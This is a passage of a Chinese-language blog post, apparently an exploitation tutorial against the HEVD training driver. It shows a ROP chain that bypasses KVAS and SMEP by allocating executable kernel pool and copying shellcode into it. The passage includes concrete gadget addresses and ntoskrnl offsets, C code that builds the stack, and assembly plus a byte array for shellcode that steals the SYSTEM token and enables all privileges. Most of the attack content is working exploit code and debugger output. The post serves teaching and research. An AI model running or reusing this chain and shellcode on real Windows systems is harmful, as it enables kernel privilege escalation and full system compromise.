0xFFFFFFFFFFFFFFF0           ;new current token: æ¶ˆé™¤ä½8ä½ï¼Œä¾¿äºè§£æToken</span><br><span class="line">    mov [rcx + 0x40], rbx</span><br><span class="line">    mov [rcx + 0x48], rbx</span><br><span class="line"></span><br><span class="line">    xor rax, rax</span><br><span class="line">    add rsp, 0x10</span><br><span class="line">    retn</span><br></pre></td></tr></table></figure>
<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/7a422f59bf47ec0ff9c55f9f9d5c580d.png" alt="image-20240120134710391" /></p>
<h1 id="kvas"><a class="markdownIt-Anchor" href="#kvas"></a> KVAS</h1>
<h2 id="a-ç®€ä»‹"><a class="markdownIt-Anchor" href="#a-ç®€ä»‹"></a> A. ç®€ä»‹</h2>
<p>KVASå…¨ç§°æ˜¯Kernel Virtual Address Shadowï¼Œå®ƒçš„å‡ºç°ä¸MeltDownï¼ˆCVE-2017-5754ï¼‰å’ŒTotalMeltDownï¼ˆCVE-2018-1038ï¼‰æœ‰å…³ã€‚</p>
<p>æˆ‘çš„æè¿°ä¸ä¸€å®šå‡†ç¡®ï¼Œå¤§è‡´ä¸Šæ¥è¯´è¿™ä¸¤ä¸ªæ¼æ´åˆ©ç”¨äº†CPUçš„ä¹±åºæ‰§è¡ŒæŠ€æœ¯ï¼Œå³CPUåœ¨æ‰§è¡Œæ—¶ä¸ä¸€å®šä¼šæŒ‰ç…§æµç¨‹æ‰§è¡Œã€‚å½“æˆ‘ä»¬è®¿é—®ä¸€ä¸ªä¸èƒ½è¢«ç”¨æˆ·æ¨¡å¼è®¿é—®çš„å†…å­˜é¡µæ—¶ï¼ŒCPUä¼šæ‰§è¡Œè¯¥è¯­å¥ç„¶åå°†å…¶ç¼“å­˜åˆ°å†…å­˜ä¸­ï¼Œç­‰åˆ°å‘ç°ä¸èƒ½è®¿é—®åè¿”å›é”™è¯¯ï¼Œä½†æ˜¯è¯¥æ•°æ®ä¾æ—§å­˜åœ¨äºç¼“å­˜å½“ä¸­ã€‚åˆ©ç”¨è¿™ç§æ€è·¯å°±å¯ä»¥å®Œå…¨è¯»å–å†…æ ¸ä¸­çš„æ•°æ®ï¼Œå®ç°æƒé™æå‡ç­‰ã€‚</p>
<p>å¾®è½¯ä¸ºäº†ç¼“è§£è¯¥æ¼æ´ï¼Œä»ç”¨æˆ·é¡µè¡¨ä¸­éš”ç¦»å‡ºå†…æ ¸é¡µè¡¨ï¼Œè®©ç”¨æˆ·æ€è®¿é—®åˆ°çš„å†…æ ¸é¡µè¡¨ä¹Ÿæ˜¯ç»è¿‡æ˜ å°„çš„ï¼Œå¹¶ä¸”ä¼šå°†ç”¨æˆ·é¡µè¡¨è‡ªåŠ¨æ ‡è®°ä¸ºNXï¼Œè®©æˆ‘ä»¬çš„shellcodeæ— æ³•æ‰§è¡Œ</p>
<h2 id="b-bypass"><a class="markdownIt-Anchor" href="#b-bypass"></a> B. Bypass</h2>
<p>è™½ç„¶ç”¨æˆ·é¡µè¡¨ä¸ºä¸å¯æ‰§è¡Œï¼Œ<strong>ä½†æ˜¯å†…æ ¸é¡µè¡¨ä»ç„¶å¯æ‰§è¡Œ</strong>ï¼Œåªä¸è¿‡ä¼šå»¶é•¿æˆ‘ä»¬ROPé“¾çš„é•¿åº¦</p>
<p>éœ€è¦ç”¨åˆ°çš„å‡½æ•°æ˜¯ï¼š<code>ExAllocatePoolWithTag</code>å’Œ<code>RtlCopyMemory</code></p>
<ul>
<li><code>ExAllocatePoolWithTag</code>ï¼šç”¨äºåœ¨å†…æ ¸ä¸­å¼€è¾Ÿä¸€å—åœ°å€</li>
<li><code>RtlCopyMemory</code>ï¼šå¤åˆ¶å†…å­˜åˆ°å†…æ ¸å¼€è¾Ÿçš„å†…å­˜æ± </li>
</ul>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">LPVOID space = <span class="built_in">ExAllocatePoolWithTag</span>(<span class="number">0</span>, <span class="number">0x100</span>, <span class="number">0xDEAD</span>);</span><br><span class="line"><span class="comment">//NonPagedPoolExecute = 0</span></span><br><span class="line"><span class="comment">//ç©ºé—´å¤§å°ï¼š0x100</span></span><br><span class="line"><span class="built_in">RtlCopyMemory</span>(space, shellcode_addr, <span class="number">0x100</span>);</span><br></pre></td></tr></table></figure>
<p>MSDNä¸­è¯´æ˜è¯¥ä¸¤ä¸ªå‡½æ•°åœ¨å†…æ ¸ä¸­å‡ä½äº<code> NtosKrnl.exe</code>é‡Œï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨ç¬¬ä¸€ç« çš„å†…å®¹å¯»æ‰¾åˆ°è¯¥åœ°å€ï¼Œå¯ä»¥ä½¿ç”¨CFF ExploreræŸ¥çœ‹å¯¼å‡ºè¡¨æ‰¾åˆ°å‡½æ•°</p>
<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/866de1aad36e03df79f0a3f799ca2e72.png" alt="image-20240120143139338" /></p>
<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/59a09be3f8b2929ced592f3a4901f054.png" alt="image-20240120143245405" /></p>
<p>éœ€è¦è¯´æ˜çš„ä¸€ç‚¹æ˜¯<code>ExAllocatePoolWithTag</code>æœ‰ä¸€ä¸ªå¾ˆæ¶å¿ƒçš„åœ°æ–¹å°±æ˜¯</p>
<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/324967fd2b7f547949278ef9bfa00206.png" alt="image-20240120213553032" /></p>
<p>è¿™ä¸‰ä¸ªmovä¼šæ‰“ä¹±æˆ‘ä»¬ç²¾å¿ƒè®¾è®¡çš„ROPé“¾ï¼Œè€Œä¸”åé¢æ ¹æœ¬æ²¡æœ‰ä½¿ç”¨åˆ°ä»–ï¼Œæ‰€ä»¥è¦ç›´æ¥è¿›å…¥<code>push rdi</code>çš„ä½ç½®</p>
<p><code>RtlCopyMemory</code>å…¶å®æ˜¯ä¸€ä¸ªå®</p>
<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/9bb79876c8b14924e6704969dc963280.png" alt="image-20240120155359370" /></p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> base = <span class="built_in">ulGetKernelBase</span>((PCHAR)<span class="string">&quot;ntoskrnl.exe&quot;</span>);</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> ulExAllocatePoolWithTag = base + <span class="number">0x9B203F</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> ulRtlCopyMemory = base + <span class="number">0x40BEC0</span>;</span><br></pre></td></tr></table></figure>
<p>æ ¹æ®å¾®è½¯çš„å‡½æ•°è°ƒç”¨è§„åˆ™ï¼Œä¼ å‚é¡ºåºæ˜¯<code>rcx</code>ï¼Œ<code>rdx</code>ï¼Œ<code>r8</code>ï¼Œè¿”å›åœ°å‚æ•°åœ¨<code>rax</code>ä¸­</p>
<p>é‚£ä¹ˆä¸€ä¸ªç†æƒ³çš„ROPå¸ƒå±€</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">pop rcx rdx r8 ret</span><br><span class="line">0</span><br><span class="line">0x100</span><br><span class="line">0xDEAD</span><br><span class="line">ExAllocatePoolWithTag</span><br><span class="line">---------------------------</span><br><span class="line">pop rcx rdx r8 ret</span><br><span class="line">0	;æš‚æ—¶</span><br><span class="line">shellcode_addr</span><br><span class="line">0x100;</span><br><span class="line">mov rcx, rax ret	;æ­¤æ—¶rcx = ExAllocatePoolWithTagè¿”å›åœ°å†…å­˜åœ°å€</span><br><span class="line">RtlCopyMemory</span><br><span class="line">---------------------------</span><br><span class="line">jmp rax</span><br></pre></td></tr></table></figure>
<p>å°±è¿™äº›gadgetä¸­çš„popä¼šæ¶ˆé™¤<code>rsp+0x28</code>çš„é©±åŠ¨çš„<code>Handle</code>å‡½æ•°è¿”å›åœ°å€ï¼Œæ‰€ä»¥é¦–å…ˆæ˜¯æŠ¬æ ˆï¼Œå¦‚<code>sub rsp, 0x100</code>ï¼Œåœ¨<code>jmp rax</code>ä¹‹å‰å¤šæ¬¡è°ƒç”¨<code>ret</code>æ¥æŠ¬å‡<code>rsp</code>çš„å€¼ï¼Œæœ€ç»ˆå›åˆ°<code>shellcode</code>è°ƒæ•´ä¸ºé€‚ç”¨çš„<code>rsp</code>å€¼ã€‚</p>
<p><strong>å®é™…æƒ…å†µä¸­ä¹Ÿä¸ä¼šæœ‰æ°å¥½çš„gadgetç”¨</strong></p>
<p>å®é™…ä¸Šèƒ½ç”¨çš„<code>mov rcx, rax</code>å¯ä»¥é€šè¿‡ä»¥ä¸‹æ–¹å¼å®ç°</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0x00000001408fa783 : push rax ; push rbx ; ret</span><br><span class="line">0x00000001408fa77b : push rax ; push rdi ; ret</span><br><span class="line">0x000000014020262C : pop rdi ; ret</span><br></pre></td></tr></table></figure>
<p>è¿™æ ·å°±èƒ½è®©rcx=raxäº†ï¼Œå¸ƒå±€åæ ˆçš„æƒ…å†µ</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ulExAllocatePoolWithTag</span><br><span class="line">pop_rdi</span><br><span class="line">pop_rcx</span><br><span class="line">push_rax_rdi</span><br></pre></td></tr></table></figure>
<ol>
<li><code>pop rdi</code>ï¼š<code>RDI</code> =<code>pop rcxåœ°å€</code>ï¼Œå‡ºæ ˆä¸€ä¸ªï¼Œ<code>rsp</code>æŒ‡å‘<code>push_rax_rdi</code>ï¼Œç„¶å<code>ret</code>è·³è½¬åˆ°è¯¥åœ°å€</li>
<li><code>push rax</code>ï¼šå°†ç”³è¯·çš„å†…æ ¸å†…å­˜åœ°å€æ”¾åˆ°äº†æ ˆä¸Šï¼Œ<code>rsp</code>æŒ‡å‘å€¼å°±ä¸ºè¯¥å†…å­˜çš„åœ°å€</li>
<li><code>push rdi; ret</code>ï¼šç­‰æ•ˆäº<code>jmp rdi</code>ï¼Œäºæ˜¯<code>ret</code>åˆ°äº†<code>pop rcx</code></li>
<li><code>pop rcx</code>ï¼šæ­¤æ—¶çš„æ ˆé¡¶ä¸º 2 ä¸­å…¥æ ˆçš„<code>rax</code></li>
</ol>
<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/28b0466a118932c4725e7f24168cef31.png" alt="image-20240120214435516" /></p>
<p>æˆåŠŸè®©<code>RCX=RAX</code></p>
<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/68943ef85bb247fa007f3cfcc84cc1e2.png" alt="image-20240120214609588" /></p>
<p>è¿™é‡Œæš‚æ—¶è®¾è®¡payload</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//typedef unsigned long long funcaddr;</span></span><br><span class="line"></span><br><span class="line">	*(funcaddr*)(stackspace + <span class="number">0x818</span>) = (funcaddr)pop_rcx;</span><br><span class="line">	*(funcaddr*)(stackspace + <span class="number">0x818</span> + <span class="number">8</span>) = (funcaddr)<span class="number">0</span>;</span><br><span class="line">	*(funcaddr*)(stackspace + <span class="number">0x818</span> + <span class="number">0x10</span>) = (funcaddr)pop_rdx;</span><br><span class="line">	*(funcaddr*)(stackspace + <span class="number">0x818</span> + <span class="number">0x18</span>) = (funcaddr)<span class="number">0x100</span>;</span><br><span class="line">	*(funcaddr*)(stackspace + <span class="number">0x818</span> + <span class="number">0x20</span>) = (funcaddr)pop_r8;</span><br><span class="line">	*(funcaddr*)(stackspace + <span class="number">0x818</span> + <span class="number">0x28</span>) = (funcaddr)<span class="number">0xDEAD</span>;</span><br><span class="line">	*(funcaddr*)(stackspace + <span class="number">0x818</span> + <span class="number">0x30</span>) = (funcaddr)ulExAllocatePoolWithTag;</span><br><span class="line"></span><br><span class="line">	*(funcaddr*)(stackspace + <span class="number">0x818</span> + <span class="number">0x38</span>) = (funcaddr)pop_rdi;	<span class="comment">//rsp = 0</span></span><br><span class="line">	*(funcaddr*)(stackspace + <span class="number">0x818</span> + <span class="number">0x40</span>) = (funcaddr)pop_rcx;	<span class="comment">//rdi = rcx --- been force to zero</span></span><br><span class="line">	*(funcaddr*)(stackspace + <span class="number">0x818</span> + <span class="number">0x48</span>) = (funcaddr)push_rax_rdi;<span class="comment">//ret rdi: pop_rcx value changed</span></span><br><span class="line">																</span><br><span class="line">	*(funcaddr*)(stackspace + <span class="number">0x818</span> + <span class="number">0x50</span>) = (funcaddr)pop_rdx;		<span class="comment">//æ­¤å¤„è¢«ä½ä½è¢«æ¸…é›¶</span></span><br><span class="line">	*(funcaddr*)(stackspace + <span class="number">0x818</span> + <span class="number">0x58</span>) = (funcaddr)shellcode_addr; </span><br><span class="line"></span><br><span class="line">	*(funcaddr*)(stackspace + <span class="number">0x818</span> + <span class="number">0x70</span>) = (funcaddr)pop_r8;</span><br><span class="line">	*(funcaddr*)(stackspace + <span class="number">0x818</span> + <span class="number">0x78</span>) = (funcaddr)<span class="built_in">sizeof</span>(cmd);</span><br><span class="line">	*(funcaddr*)(stackspace + <span class="number">0x818</span> + <span class="number">0x80</span>) = (funcaddr)ulRtlCopyMemory;</span><br><span class="line">	*(funcaddr*)(stackspace + <span class="number">0x818</span> + <span class="number">0x88</span>) = (funcaddr)jmp_rax;</span><br></pre></td></tr></table></figure>
<p>ä½†æ˜¯è¿›è¡Œ<code>ExAllocatePoolWithTag</code></p>
<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/bd6c315f3f534e5d95e65b69621299b0.png" alt="image-20240121084806324" /></p>
<p>æ‰“æ–­äº†ROPé“¾ï¼Œè®©<code>rsp+68</code>çš„ä½ç½®çš„ä½32ä½æ¸…é›¶äº†ï¼Œè¿™è®©æˆ‘ä»¬éœ€è¦è°ƒæ•´è¿™æ®µropé“¾</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">*(funcaddr*)(stackspace + <span class="number">0x818</span> + <span class="number">0x50</span>) = (funcaddr)pop_rdx;		<span class="comment">//æ­¤å¤„è¢«ä½ä½è¢«æ¸…é›¶</span></span><br><span class="line">*(funcaddr*)(stackspace + <span class="number">0x818</span> + <span class="number">0x58</span>) = (funcaddr)shellcode_addr; </span><br><span class="line">*(funcaddr*)(stackspace + <span class="number">0x818</span> + <span class="number">0x60</span>) = (funcaddr)pop_rdx;		<span class="comment">//æ¢å¤rdx</span></span><br><span class="line">*(funcaddr*)(stackspace + <span class="number">0x818</span> + <span class="number">0x68</span>) = (funcaddr)shellcode_addr;</span><br><span class="line">   </span><br><span class="line">   *(funcaddr*)(stackspace + <span class="number">0x818</span> + <span class="number">0x70</span>) = (funcaddr)pop_r8;</span><br><span class="line">*(funcaddr*)(stackspace + <span class="number">0x818</span> + <span class="number">0x78</span>) = (funcaddr)<span class="built_in">sizeof</span>(cmd);</span><br></pre></td></tr></table></figure>
<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/bedc06d732b94afafa28a2688c0a94d6.png" alt="image-20240121093505807" /></p>
<p>åœ¨è®¾ç½®<code>CR4.SMEP</code>çš„æƒ…å†µä¸‹ï¼Œä¾é å†…æ ¸åˆ†é…çš„å†…å­˜ï¼ŒæˆåŠŸè¿è¡Œäº†shellcodeï¼ŒROPé“¾è¿›è¡Œäº†å¤šæ¬¡è°ƒç”¨ï¼Œè®©æœ€åshellcodeä¸­çš„<code>rsp</code>å€¼ä¸å¥½ä¼°è®¡ï¼Œå¹¶ä¸”æ ˆçš„æƒ…å†µå¯èƒ½éšç€å‡½æ•°çš„è°ƒç”¨å°†åŸæœ‰çš„å€¼æŠ¹å»ï¼Œ<strong>è¿™é‡Œå…ˆæŠŠshellcodeæ¢æˆä»TrapFrameè¿”å›çš„</strong></p>
<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/39d57b872ac0473e469f8056ebedb9d3.png" alt="image-20240121095833438" /></p>
<h2 id="c-ä¼˜åŒ–shellcode"><a class="markdownIt-Anchor" href="#c-ä¼˜åŒ–shellcode"></a> C. ä¼˜åŒ–shellcode</h2>
<p>æ‰€ä»¥è¿™æ®µshellcodeå‚è€ƒshellcodeç¼–å†™çš„Cã€Déƒ¨åˆ†ï¼ŒåŠ ä¸Šäº†æ‰€æœ‰åŠŸèƒ½Enabledçš„shellcodeç‰‡æ®µ</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">[Bits 64]</span><br><span class="line"></span><br><span class="line">_start:    </span><br><span class="line">    xor rax, rax</span><br><span class="line">    mov rax, gs:[rax + 0x188]</span><br><span class="line">    mov rax, [rax + 0xb8]     ;rax = å½“å‰EPROCESS</span><br><span class="line">    mov r9, rax               ;r9  = å½“å‰EPROCESS</span><br><span class="line">    mov rax, [rax + 0x448]    ;rax = å½“å‰EPROCESS.List</span><br><span class="line">    mov rax, [rax]            ;rax = å½“å‰EPROCESS.List-&gt;flink</span><br><span class="line"></span><br><span class="line">__loop:</span><br><span class="line">    mov rdx, [rax - 0x8]      ;rdx = ä¸Šä¸€ä¸ªè¿›ç¨‹çš„ upid</span><br><span class="line">    mov r8, rax               ;r8  = å½“å‰EPROCESS.List-&gt;flink</span><br><span class="line">    mov rax, [rax]            ;rax = ä¸Šä¸€ä¸ªè¿›ç¨‹çš„.List</span><br><span class="line">    cmp rdx, 0x4</span><br><span class="line">    jnz __loop</span><br><span class="line"></span><br><span class="line">    ;rdx = 4</span><br><span class="line">    ;r8 = System EPROCESS</span><br><span class="line"></span><br><span class="line">    mov rdx, [r8+0x70]      ;rdx = system token</span><br><span class="line">    and rdx, -0x8           ;æ¶ˆé™¤ä½4ä½</span><br><span class="line">    mov rcx, [r9+0x4b8]     ;å½“å‰EPROCESSçš„token</span><br><span class="line">    and rcx, 0x7            ;</span><br><span class="line">    add rdx, rcx            ;rdx = ç³»ç»Ÿtokené«˜ä½+å½“å‰tokenä½4ä½</span><br><span class="line">    mov [r9+0x4b8], rdx     ;å°†åˆæˆçš„tokenå¤åˆ¶ç»™å½“å‰</span><br><span class="line"></span><br><span class="line">    ;Enable ALL</span><br><span class="line">    mov rdx, [r8 + 0x70]      ;rdx = system token</span><br><span class="line">    and rdx, 0xFFFFFFFFFFFFFFF0           ;system token: æ¶ˆé™¤ä½8ä½ï¼Œä¾¿äºè§£æToken</span><br><span class="line">    mov rbx, [rdx + 0x40]     ;rbx = System tokençš„Present</span><br><span class="line">    mov rcx, [r9 + 0x4b8]     ;rcx = æ–°çš„EPROCESSçš„token</span><br><span class="line">    and rcx, 0xFFFFFFFFFFFFFFF0           ;new current token: æ¶ˆé™¤ä½8ä½ï¼Œä¾¿äºè§£æToken</span><br><span class="line">    mov [rcx + 0x40], rbx</span><br><span class="line">    mov [rcx + 0x48], rbx</span><br><span class="line"></span><br><span class="line">    mov     rax, gs:188h</span><br><span class="line">    mov     cx, [rax+1E4h]</span><br><span class="line">    inc     cx</span><br><span class="line">    mov     [rax+1E4h], cx</span><br><span class="line">    mov     rdx, [rax+90h]</span><br><span class="line">    mov     rcx, [rdx+168h]</span><br><span class="line">    mov     r11, [rdx+178h]</span><br><span class="line">    mov     rsp, [rdx+180h]</span><br><span class="line">    mov     rbp, [rdx+158h]</span><br><span class="line">    xor     eax, eax</span><br><span class="line">    swapgs</span><br><span class="line">    o64 sysret</span><br></pre></td></tr></table></figure>
<p>å¾—åˆ°shellcode</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">char</span> cmd[<span class="number">176</span>] = &#123;</span><br><span class="line">	<span class="number">0x48</span>, <span class="number">0x31</span>, <span class="number">0xC0</span>, <span class="number">0x65</span>, <span class="number">0x48</span>, <span class="number">0x8B</span>, <span class="number">0x80</span>, <span class="number">0x88</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>,</span><br><span class="line">	<span class="number">0x8B</span>, <span class="number">0x80</span>, <span class="number">0xB8</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x49</span>, <span class="number">0x89</span>, <span class="number">0xC1</span>, <span class="number">0x48</span>, <span class="number">0x8B</span>, <span class="number">0x80</span>,</span><br><span class="line">	<span class="number">0x48</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x8B</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x8B</span>, <span class="number">0x50</span>, <span class="number">0xF8</span>, <span class="number">0x49</span>,</span><br><span class="line">	<span class="number">0x89</span>, <span class="number">0xC0</span>, <span class="number">0x48</span>, <span class="number">0x8B</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x83</span>, <span class="number">0xFA</span>, <span class="number">0x04</span>, <span class="number">0x75</span>, <span class="number">0xF0</span>, <span class="number">0x49</span>,</span><br><span class="line">	<span class="number">0x8B</span>, <span class="number">0x50</span>, <span class="number">0x70</span>, <span class="number">0x48</span>, <span class="number">0x83</span>, <span class="number">0xE2</span>, <span class="number">0xF8</span>, <span class="number">0x49</span>, <span class="number">0x8B</span>, <span class="number">0x89</span>, <span class="number">0xB8</span>, <span class="number">0x04</span>,</span><br><span class="line">	<span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x83</span>, <span class="number">0xE1</span>, <span class="number">0x07</span>, <span class="number">0x48</span>, <span class="number">0x01</span>, <span class="number">0xCA</span>, <span class="number">0x49</span>, <span class="number">0x89</span>, <span class="number">0x91</span>,</span><br><span class="line">	<span class="number">0xB8</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x49</span>, <span class="number">0x8B</span>, <span class="number">0x50</span>, <span class="number">0x70</span>, <span class="number">0x48</span>, <span class="number">0x83</span>, <span class="number">0xE2</span>, <span class="number">0xF0</span>,</span><br><span class="line">	<span class="number">0x48</span>, <span class="number">0x8B</span>, <span class="number">0x5A</span>, <span class="number">0x40</span>, <span class="number">0x49</span>, <span class="number">0x8B</span>, <span class="number">0x89</span>, <span class="number">0xB8</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>,</span><br><span class="line">	<span class="number">0x83</span>, <span class="number">0xE1</span>, <span class="number">0xF0</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0x59</span>, <span class="number">0x40</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0x59</span>, <span class="number">0x48</span>, <span class="number">0x65</span>,</span><br><span class="line">	<span class="number">0x48</span>, <span class="number">0x8B</span>, <span class="number">0x04</span>, <span class="number">0x25</span>, <span class="number">0x88</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x66</span>, <span class="number">0x8B</span>, <span class="number">0x88</span>, <span class="number">0xE4</span>,</span><br><span class="line">	<span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x66</span>, <span class="number">0xFF</span>, <span class="number">0xC1</span>, <span class="number">0x66</span>, <span class="number">0x89</span>, <span class="number">0x88</span>, <span class="number">0xE4</span>, <span class="number">0x01</span>, <span class="number">0x00</span>,</span><br><span class="line">	<span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x8B</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x8B</span>, <span class="number">0x8A</span>, <span class="number">0x68</span>,</span><br><span class="line">	<span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x4C</span>, <span class="number">0x8B</span>, <span class="number">0x9A</span>, <span class="number">0x78</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x8B</span>,</span><br><span class="line">	<span class="number">0xA2</span>, <span class="number">0x80</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x8B</span>, <span class="number">0xAA</span>, <span class="number">0x58</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">	<span class="number">0x31</span>, <span class="number">0xC0</span>, <span class="number">0x0F</span>, <span class="number">0x01</span>, <span class="number">0xF8</span>, <span class="number">0x48</span>, <span class="number">0x0F</span>, <span class="number">0x07</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/92433bde7fdb3c57a079ce6037669523.png" alt="image-20240121200156534" /></p>
<p>ç¼ºç‚¹å°±æ˜¯ç¨‹åºæ— æ³•exité€€å‡ºï¼Œä¸è¿‡å¯ä»¥åœ¨shellcodeä¸­è®¾ç½®Tokenè¿ç§»ç­‰ä¸€äº›å…¶ä»–æ“ä½œï¼Œè¿™é‡Œå°±ä¸å±•å¼€äº†</p>
<h1 id="å‚è€ƒ"><a class="markdownIt-Anchor" href="#å‚è€ƒ"></a> å‚è€ƒ</h1>
<p><a target="_blank" rel="noopener" href="https://wumb0.in/finding-the-base-of-the-windows-kernel.html">https://wumb0.in/finding-the-base-of-the-windows-kernel.html</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/xct/windows-kernel-exploits">https://github.com/xct/windows-kernel-exploits</a></p>
<p><a target="_blank" rel="noopener" href="https://connormcgarr.github.io/x64-Kernel-Shellcode-Revisited-and-SMEP-Bypass/">https://connormcgarr.github.io/x64-Kernel-Shellcode-Revisited-and-SMEP-Bypass/</a></p>
<p><a target="_blank" rel="noopener" href="https://hshrzd.wordpress.com/2017/06/22/starting-with-windows-kernel-exploitation-part-3-stealing-the-access-token/">https://hshrzd.wordpress.com/2017/06/22/starting-with-windows-kernel-exploitation-part-3-stealing-the-access-token/</a></p>
<p><a target="_blank" rel="noopener" href="https://mdanilor.github.io/posts/hevd-2/">https://mdanilor.github.io/posts/hevd-2/</a></p>
</div></article><div class="pagination"><a class="pagination__link pagination__prev" href="/2024/02/15/intranet/">prev_post</a><a class="pagination__link pagination__next" href="/2024/01/25/win-hevd-exp-stackoverflow-II/">next_post</a></div></main><footer class="footer metadata"><p class="footer__text">Â© 2026 Joe1sn</p><p class="footer__text">Powered by <a class="footer__text__link" href="https://hexo.io/" target="_blank">Hexo</a> &amp; <a class="footer__text__link" href="https://pages.github.com/" target="_blank">Github Page</a></p></footer></div></body></html>